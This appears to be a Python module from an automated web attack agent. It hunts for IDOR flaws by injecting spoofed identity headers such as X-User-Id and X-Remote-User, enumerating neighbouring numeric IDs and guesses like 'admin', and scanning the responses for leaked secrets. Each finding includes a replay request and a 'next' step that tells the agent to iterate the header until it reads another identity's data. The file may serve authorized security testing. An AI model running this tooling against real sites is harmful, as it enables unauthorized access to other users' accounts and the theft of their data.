from __future__ import annotations

import re
from urllib.parse import urlsplit, urlunsplit

from ravage.agent_core.agent_state import AgentState
from ravage.probes.specialists.idor_auth import _headers_from_signal, _idor_auth_header_contexts
from ravage.probes.specialists.idor_signals import (
    _auth_blocked,
    _idor_access_signal,
    _object_access_markers,
)
from ravage.probes.specialists.shared import (
    _dedupe,
    _idor_id_format,
    _name_looks_idor,
    _signal_form_targets,
    _surface_endpoints,
    _target_headers,
)
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, form_defaults, response_secrets
from ravage.web_core.proof_recognizer import recognize_proofs

_IDENTITY_HEADERS = (
    "X-User-Id",
    "X-UserId",
    "X-User",
    "X-Userid",
    "X-Account-Id",
    "X-Customer-Id",
    "X-Id",
    "X-Auth-User",
    "X-Authenticated-User",
    "X-Remote-User",
    "X-Forwarded-User",
    "User-Id",
)


def _probe_identity_header_idor(
    session: ProbeSession,
    state: AgentState,
    *,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    sub_budget = min(budget, 42)
    spent = 0
    auth_contexts = _idor_auth_header_contexts(state) or [{}]
    headers_to_try = _identity_headers_from_state(state)
    candidate_values = _identity_header_candidate_values(state)
    for url in _identity_header_endpoints(session, state)[:8]:
        for auth_headers in auth_contexts[:3]:
            if sub_budget - spent <= 0:
                break
            baseline_headers = dict(auth_headers)
            baseline = session.get(url, headers=baseline_headers or None)
            spent += 1
            requests.append(
                baseline.summary(body_chars=180)
                | {
                    "probe_kind": "identity_header_baseline",
                    "url": url,
                    "authenticated": bool(baseline_headers),
                }
            )
            if baseline.status is None:
                continue
            if baseline.status in {404, 405}:
                continue
            for header in headers_to_try:
                if sub_budget - spent <= 0:
                    break
                for candidate in candidate_values:
                    if sub_budget - spent <= 0:
                        break
                    probe_headers = dict(baseline_headers)
                    probe_headers[header] = candidate
                    response = session.get(url, headers=probe_headers)
                    spent += 1
                    requests.append(
                        response.summary(body_chars=280)
                        | {
                            "probe_kind": "identity_header_idor",
                            "url": url,
                            "header": header,
                            "candidate": candidate,
                            "authenticated": bool(baseline_headers),
                        }
                    )
                    proofs = recognize_proofs(response.body)
                    secrets_found = response_secrets(response)
                    if not proofs and not secrets_found and not _identity_header_honored(baseline, response):
                        continue
                    signal = _idor_access_signal(
                        baseline=baseline,
                        response=response,
                        original_id=_matching_header_value(baseline_headers, header),
                        candidate_id=candidate,
                    )
                    if proofs or secrets_found or signal:
                        findings.append(
                            {
                                "type": (
                                    "idor_identity_header_exposed_secret"
                                    if proofs or secrets_found
                                    else "idor_identity_header_signal"
                                ),
                                "url": url,
                                "header": header,
                                "candidate_id": candidate,
                                "signal": signal or {"kind": "identity_header_honored"},
                                "proofs": proofs,
                                "matches": secrets_found,
                                "response": response.summary(body_chars=420),
                                "replay": {"method": "GET", "url": url, "headers": probe_headers},
                                "next": (
                                    "An identity request header overrode the authorization context; iterate "
                                    f"{header} across nearby observed identity values to read another identity's object."
                                ),
                            }
                        )
                        if proofs:
                            return findings, requests, budget - spent
    return findings, requests, budget - spent


def _has_identity_header_context(state: AgentState) -> bool:
    return bool(_observed_identity_header_names(state))


def _identity_headers_from_state(state: AgentState) -> list[str]:
    headers = _observed_identity_header_names(state)
    return _dedupe([*headers, *_IDENTITY_HEADERS])[:16]


def _observed_identity_header_names(state: AgentState) -> list[str]:
    headers: list[str] = []
    for raw in state.signals.get("auth_headers", []):
        parsed = _headers_from_signal(str(raw))
        for name in parsed:
            if _header_name_looks_identity(name):
                headers.append(name)
    for form in _signal_form_targets(state):
        for name in _target_headers({"form": form}):
            if _header_name_looks_identity(name):
                headers.append(name)
    return _dedupe(headers)


def _identity_header_candidate_values(state: AgentState) -> list[str]:
    values: list[str] = []
    for raw in state.signals.get("auth_headers", []):
        parsed = _headers_from_signal(str(raw))
        for name, value in parsed.items():
            if _header_name_looks_identity(name):
                values.append(value)
    for form in _signal_form_targets(state):
        headers = _target_headers({"form": form})
        for name, value in headers.items():
            if _header_name_looks_identity(name):
                values.append(value)
        defaults = form_defaults(form)
        for name, value in defaults.items():
            value_format = _idor_id_format(value)
            if _name_looks_idor(name, "") or value_format in {"numeric", "uuid", "hash", "email"}:
                values.append(value)
    candidates: list[str] = []
    unique_values = _dedupe(_non_empty_stripped_values(values))
    for value in _prioritize_identity_values(unique_values)[:12]:
        candidates.append(value)
        if re.fullmatch(r"\d+", value):
            current = int(value)
            for offset in (
                1,
                -1,
                2,
                -2,
                3,
                -3,
                5,
                -5,
                8,
                -8,
                10,
                -10,
                13,
                -13,
                16,
                -16,
                20,
                -20,
                25,
                -25,
                32,
                -32,
            ):
                candidate = current + offset
                if candidate >= 0:
                    candidates.append(str(candidate))
    candidates.extend(["1", "2", "3", "0", "4", "5", "100", "1000", "admin", "test", "guest"])
    return _dedupe(candidates)[:80]


def _non_empty_stripped_values(values: list[str]) -> list[str]:
    stripped_values: list[str] = []
    for item in values:
        text = str(item).strip()
        if text:
            stripped_values.append(text)
    return stripped_values


def _prioritize_identity_values(values: list[str]) -> list[str]:
    return sorted(values, key=_identity_value_sort_key)


def _identity_value_sort_key(value: str) -> tuple[int, str]:
    return _identity_value_priority(value), value


def _identity_value_priority(value: str) -> int:
    id_format = _idor_id_format(value)
    if id_format == "numeric":
        return 0
    if id_format in {"uuid", "hash"}:
        return 1
    if id_format == "email":
        return 2
    return 3


def _header_name_looks_identity(name: str) -> bool:
    lowered = name.lower().replace("_", "-")
    if lowered.startswith("x-") and _header_has_identity_marker(lowered):
        return True
    return _header_has_explicit_identity_name(lowered)


def _header_has_identity_marker(lowered: str) -> bool:
    for token in ("user", "account", "customer", "member", "tenant", "org", "identity", "id"):
        if token in lowered:
            return True
    return False


def _header_has_explicit_identity_name(lowered: str) -> bool:
    explicit_names = ("user-id", "account-id", "customer-id", "member-id", "tenant-id", "org-id")
    for token in explicit_names:
        if token in lowered:
            return True
    return False


def _matching_header_value(headers: dict[str, str], header: str) -> str:
    wanted = header.lower()
    for name, value in headers.items():
        if name.lower() == wanted:
            return value
    return ""


def _identity_header_endpoints(session: ProbeSession, state: AgentState) -> list[str]:
    keywords = (
        "dashboard",
        "account",
        "profile",
        "order",
        "invoice",
        "admin",
        "home",
        "settings",
        "balance",
        "wallet",
        "me",
    )
    urls: list[str] = []
    for path in ("/dashboard", "/account", "/profile", "/me", "/home", "/settings", "/admin", "/orders"):
        urls.append(session.absolute(path))
    for endpoint in _surface_endpoints(state):
        parts = urlsplit(endpoint)
        if _path_has_keyword(parts.path.lower(), keywords):
            urls.append(urlunsplit((parts.scheme, parts.netloc, parts.path, "", "")))
    return sorted(_dedupe(urls), key=_identity_header_endpoint_sort_key)


def _identity_header_endpoint_sort_key(url: str) -> tuple[int, int, str]:
    path = urlsplit(url).path.lower().rstrip("/") or "/"
    penalty = 0
    if _path_has_keyword(path, ("register", "signup", "sign-up", "login", "password", "reset")):
        penalty += 30
    preferred = {
        "/dashboard": 0,
        "/me": 1,
        "/account": 2,
        "/profile": 3,
        "/home": 4,
        "/settings": 5,
        "/admin": 6,
        "/orders": 7,
    }
    rank = preferred.get(path, 12)
    return penalty + rank, len(path), path


def _path_has_keyword(path: str, keywords: tuple[str, ...]) -> bool:
    for word in keywords:
        if word in path:
            return True
    return False


def _identity_header_honored(baseline: ProbeResponse, probe: ProbeResponse) -> bool:
    if probe.status is None:
        return False
    if probe.status != baseline.status:
        return True
    if _auth_blocked(baseline) and not _auth_blocked(probe):
        return True
    if abs(len(probe.body) - len(baseline.body)) >= 25:
        return True
    return probe.body != baseline.body and bool(_object_access_markers(probe.body))
